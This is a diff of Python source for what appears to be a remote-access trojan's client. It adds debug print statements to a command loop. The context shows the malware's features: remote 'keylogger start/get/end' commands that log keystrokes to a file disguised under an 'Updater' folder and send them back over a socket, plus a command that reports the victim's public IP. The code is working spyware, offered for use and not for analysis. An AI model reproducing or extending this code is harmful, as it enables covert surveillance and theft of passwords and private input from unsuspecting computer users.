@@ -363,12 +363,14 @@ def run_commands():
                     connection.send(str.encode(
                         "Sorry, but this command is only available for windows and mac os"))
             elif ldata == "keylogger start":
+                print("Start command recieved")
                 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
                     connection.send(str.encode("exists"))
                 else:
                     connection.send(str.encode("started"))
                     start_keylogger()
             elif ldata == "keylogger get":
+                print("Get command recieved")
                 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt") == False:
                     connection.send(str.encode("nan"))
                 else:
@@ -377,6 +379,7 @@ def run_commands():
                         connection.send(str.encode(file.read()))
                         file.close()
             elif ldata == "keylogger end":
+                print("End command recieved")
                 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
                     connection.send(str.encode("nan"))
                 else:
@@ -436,6 +439,7 @@ def run_commands():
             elif "pubip" in ldata:
                 publicIP = requests.get('https://api.ipify.org/').text
                 connection.send(str.encode(publicIP))
+            
     except Exception as e:
         # sys.exit()
         # If we uncomment the line above, you will no longer be able to connect to the client computer after the connection ends (until the file is relaunched)
